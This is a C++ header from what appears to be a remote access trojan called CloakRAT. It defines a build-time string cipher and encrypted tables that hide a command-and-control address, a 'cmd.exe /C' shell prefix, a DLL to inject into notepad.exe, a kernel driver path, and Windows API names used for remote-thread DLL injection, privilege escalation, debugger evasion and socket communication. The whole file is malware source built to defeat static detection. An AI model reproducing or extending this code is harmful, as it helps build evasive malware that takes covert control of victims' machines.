#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (uint8_t)((i % 4 | ((i + 9) * 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i - BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 30)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 5, 112, 45, 174, 96, 175, 242, 56, 124, 102, 182, 223, 3, 98, 209, 63 };

typedef struct EncryptedBytes {
    uint8_t* data;
    size_t length;
} EncryptedBytes;

// "127.0.0.1"
static uint8_t str_ip_data[] = { 104, 46, 34, 58, 48, 111, 50, 13, 16, 14 };
static EncryptedBytes str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static uint8_t str_cmd_data[] = { 64, 124, 125, 105, 48, 58, 100, 88, 30, 16, 23 };
static EncryptedBytes str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static uint8_t str_dllPath_data[] = { 1, 92, 42, 81, 75, 44, 121, 79, 77, 99, 32, 124, 70, 88, 84, 1, 92, 122, 103, 54, 122, 52, 108, 1, 9, 82, 38, 102, 37, 79, 112, 126, 55, 67, 111, 113, 33, 82, 119, 79, 11, 91, 48, 93, 120, 99, 84, 115, 99, 115, 88, 56, 13, 122, 64, 118, 42, 112, 61, 86, 77, 86, 108, 67, 74, 119, 116 };
static EncryptedBytes str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static uint8_t str_procName_data[] = { 0, 113, 127, 121, 123, 47, 125, 89, 16, 90, 44, 120 };
static EncryptedBytes str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "C:\Windows\System32\drivers\gdhpl5ei.sys"
static uint8_t str_kphDriverPathOnDisk_data[] = { 55, 92, 42, 81, 73, 54, 114, 89, 81, 72, 39, 65, 121, 22, 31, 41, 125, 114, 39, 111, 82, 63, 110, 52, 40, 88, 38, 126, 10, 88, 117, 117, 34, 115, 25, 120, 39, 29, 111, 100, 57 };
static EncryptedBytes str_kphDriverPathOnDisk = {
    str_kphDriverPathOnDisk_data,
    sizeof(str_kphDriverPathOnDisk_data)
};

// "NtSetInformationThread"
static uint8_t str_NtSetInformationThread_data[] = { 26, 81, 100, 94, 123, 43, 85, 83, 88, 80, 38, 112, 75, 27, 5, 50, 118, 75, 124, 47, 107, 58, 120 };
static EncryptedBytes str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static uint8_t str_GetCurrentThread_data[] = { 70, 88, 117, 121, 93, 42, 110, 79, 91, 81, 32, 73, 66, 29, 9, 60, 124 };
static EncryptedBytes str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static uint8_t str_Sleep_data[] = { 122, 76, 124, 104, 123, 47 };
static EncryptedBytes str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static uint8_t str_OpenProcess_data[] = { 74, 80, 96, 104, 112, 15, 110, 82, 93, 90, 39, 110 };
static EncryptedBytes str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static uint8_t str_VirtualAllocEx_data[] = { 82, 73, 121, 127, 106, 42, 125, 81, 127, 83, 56, 114, 73, 42, 20 };
static EncryptedBytes str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static uint8_t str_WriteProcessMemory_data[] = { 27, 72, 98, 100, 106, 58, 76, 79, 81, 92, 49, 110, 89, 34, 9, 48, 119, 109, 109 };
static EncryptedBytes str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static uint8_t str_LoadLibraryA_data[] = { 20, 83, 127, 108, 122, 19, 117, 95, 76, 94, 38, 100, 107 };
static EncryptedBytes str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "CreateRemoteThread"
static uint8_t str_CreateRemoteThread_data[] = { 17, 92, 98, 104, 127, 43, 121, 111, 91, 82, 59, 105, 79, 59, 4, 47, 125, 126, 112 };
static EncryptedBytes str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static uint8_t str_CloseHandle_data[] = { 44, 92, 124, 98, 109, 58, 84, 92, 80, 91, 56, 120 };
static EncryptedBytes str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static uint8_t str_LookupPrivilegeValueA_data[] = { 118, 83, 127, 98, 117, 42, 108, 109, 76, 86, 34, 116, 70, 10, 11, 56, 78, 126, 120, 40, 107, 26 };
static EncryptedBytes str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static uint8_t str_GetLastError_data[] = { 82, 88, 117, 121, 82, 62, 111, 73, 123, 77, 38, 114, 88 };
static EncryptedBytes str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static uint8_t str_AdjustTokenPrivileges_data[] = { 74, 94, 116, 103, 107, 44, 104, 105, 81, 84, 49, 115, 122, 29, 5, 43, 113, 115, 113, 58, 107, 40 };
static EncryptedBytes str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static uint8_t str_OpenProcessToken_data[] = { 93, 80, 96, 104, 112, 15, 110, 82, 93, 90, 39, 110, 126, 0, 7, 56, 118 };
static EncryptedBytes str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static uint8_t str_GetCurrentProcess_data[] = { 11, 88, 117, 121, 93, 42, 110, 79, 91, 81, 32, 77, 88, 0, 15, 56, 107, 108 };
static EncryptedBytes str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static uint8_t str_CreateToolhelp32Snapshot_data[] = { 91, 92, 98, 104, 127, 43, 121, 105, 81, 80, 56, 117, 79, 3, 28, 110, 42, 76, 122, 60, 126, 40, 116, 50, 42 };
static EncryptedBytes str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static uint8_t str_Process32First_data[] = { 99, 79, 98, 98, 125, 58, 111, 78, 13, 13, 18, 116, 88, 28, 24 };
static EncryptedBytes str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static uint8_t str_Process32Next_data[] = { 117, 79, 98, 98, 125, 58, 111, 78, 13, 13, 26, 120, 82, 27 };
static EncryptedBytes str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static uint8_t str_CreatePipe_data[] = { 56, 92, 98, 104, 127, 43, 121, 109, 87, 79, 49 };
static EncryptedBytes str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static uint8_t str_SetHandleInformation_data[] = { 80, 76, 117, 121, 86, 62, 114, 89, 82, 90, 29, 115, 76, 0, 30, 48, 121, 107, 125, 50, 96 };
static EncryptedBytes str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static uint8_t str_ReadFile_data[] = { 64, 77, 117, 108, 122, 25, 117, 81, 91 };
static EncryptedBytes str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static uint8_t str_FormatMessageA_data[] = { 34, 89, 127, 127, 115, 62, 104, 112, 91, 76, 39, 124, 77, 10, 45 };
static EncryptedBytes str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static uint8_t str_LocalFree_data[] = { 40, 83, 127, 110, 127, 51, 90, 79, 91, 90 };
static EncryptedBytes str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static uint8_t str_CreateProcessA_data[] = { 82, 92, 98, 104, 127, 43, 121, 109, 76, 80, 55, 120, 89, 28, 45 };
static EncryptedBytes str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static uint8_t str_IsDebuggerPresent_data[] = { 84, 86, 99, 73, 123, 61, 105, 90, 89, 90, 38, 77, 88, 10, 31, 56, 118, 107 };
static EncryptedBytes str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static uint8_t str_GetModuleHandleW_data[] = { 108, 88, 117, 121, 83, 48, 120, 72, 82, 90, 28, 124, 68, 11, 0, 56, 79 };
static EncryptedBytes str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static uint8_t str_VirtualProtect_data[] = { 2, 73, 121, 127, 106, 42, 125, 81, 110, 77, 59, 105, 79, 12, 24 };
static EncryptedBytes str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static uint8_t str_HeapSetInformation_data[] = { 75, 87, 117, 108, 110, 12, 121, 73, 119, 81, 50, 114, 88, 2, 13, 41, 113, 112, 122 };
static EncryptedBytes str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static uint8_t str_FindWindowW_data[] = { 88, 89, 121, 99, 122, 8, 117, 83, 90, 80, 35, 74 };
static EncryptedBytes str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static uint8_t str_GetProcessHeap_data[] = { 110, 88, 117, 121, 78, 45, 115, 94, 91, 76, 39, 85, 79, 14, 28 };
static EncryptedBytes str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static uint8_t str_GetComputerNameW_data[] = { 89, 88, 117, 121, 93, 48, 113, 77, 75, 75, 49, 111, 100, 14, 1, 56, 79 };
static EncryptedBytes str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static uint8_t str_OpenThread_data[] = { 0, 80, 96, 104, 112, 11, 116, 79, 91, 94, 48 };
static EncryptedBytes str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static uint8_t str_GetEnvironmentVariableW_data[] = { 62, 88, 117, 121, 91, 49, 106, 84, 76, 80, 58, 112, 79, 1, 24, 11, 121, 109, 125, 60, 108, 55, 121, 10 };
static EncryptedBytes str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static uint8_t str_GetThreadContext_data[] = { 79, 88, 117, 121, 74, 55, 110, 88, 95, 91, 23, 114, 68, 27, 9, 37, 108 };
static EncryptedBytes str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static uint8_t str_IsWow64Process_data[] = { 74, 86, 99, 90, 113, 40, 42, 9, 110, 77, 59, 126, 79, 28, 31 };
static EncryptedBytes str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static uint8_t str_GetWindowLongPtrW_data[] = { 123, 88, 117, 121, 73, 54, 114, 89, 81, 72, 24, 114, 68, 8, 60, 41, 106, 72 };
static EncryptedBytes str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static uint8_t str_GetWindowRect_data[] = { 34, 88, 117, 121, 73, 54, 114, 89, 81, 72, 6, 120, 73, 27 };
static EncryptedBytes str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static uint8_t str_WSAStartup_data[] = { 58, 72, 67, 76, 77, 43, 125, 79, 74, 74, 36 };
static EncryptedBytes str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static uint8_t str_htons_data[] = { 20, 119, 100, 98, 112, 44 };
static EncryptedBytes str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static uint8_t str_inet_pton_data[] = { 68, 118, 126, 104, 106, 0, 108, 73, 81, 81 };
static EncryptedBytes str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static uint8_t str_connect_data[] = { 61, 124, 127, 99, 112, 58, 127, 73 };
static EncryptedBytes str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static uint8_t str_htonl_data[] = { 3, 119, 100, 98, 112, 51 };
static EncryptedBytes str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static uint8_t str_send_data[] = { 120, 108, 117, 99, 122 };
static EncryptedBytes str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static uint8_t str_socket_data[] = { 20, 108, 127, 110, 117, 58, 104 };
static EncryptedBytes str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static uint8_t str_recv_data[] = { 113, 109, 117, 110, 104 };
static EncryptedBytes str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static uint8_t str_ntohl_data[] = { 24, 113, 100, 98, 118, 51 };
static EncryptedBytes str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static uint8_t str_closesocket_data[] = { 126, 124, 124, 98, 109, 58, 111, 82, 93, 84, 49, 105 };
static EncryptedBytes str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static uint8_t str_WSACleanup_data[] = { 120, 72, 67, 76, 93, 51, 121, 92, 80, 74, 36 };
static EncryptedBytes str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static uint8_t str_kernel32_data[] = { 51, 116, 117, 127, 112, 58, 112, 14, 12, 17, 48, 113, 70 };
static EncryptedBytes str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static uint8_t str_ntdll_data[] = { 49, 113, 100, 105, 114, 51, 50, 89, 82, 83 };
static EncryptedBytes str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static uint8_t str_advapi32_data[] = { 36, 126, 116, 123, 127, 47, 117, 14, 12, 17, 48, 113, 70 };
static EncryptedBytes str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static uint8_t str_ws2_32_data[] = { 113, 104, 99, 63, 65, 108, 46, 19, 90, 83, 56 };
static EncryptedBytes str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static uint8_t str_user32_data[] = { 98, 106, 99, 104, 108, 108, 46, 19, 90, 83, 56 };
static EncryptedBytes str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static uint8_t str_WSAGetLastError_data[] = { 118, 72, 67, 76, 89, 58, 104, 113, 95, 76, 32, 88, 88, 29, 3, 47 };
static EncryptedBytes str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

